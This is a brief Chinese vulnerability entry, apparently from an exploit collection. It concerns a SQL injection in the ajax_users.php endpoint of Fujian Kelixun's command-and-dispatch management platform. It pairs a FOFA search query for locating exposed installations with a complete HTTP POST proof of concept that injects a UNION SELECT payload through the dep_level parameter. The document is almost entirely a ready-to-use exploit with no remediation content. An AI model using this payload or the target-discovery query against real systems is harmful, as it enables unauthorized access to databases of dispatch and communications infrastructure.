## 福建科立讯通信指挥调度管理平台ajax_users.php存在SQL注入漏洞

## fofa
```
body="app/structure/departments.php"||app="指挥调度管理平台"
```

## poc
```
POST /app/ext/ajax_users.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Content-Type: application/x-www-form-urlencoded
 
dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -
```
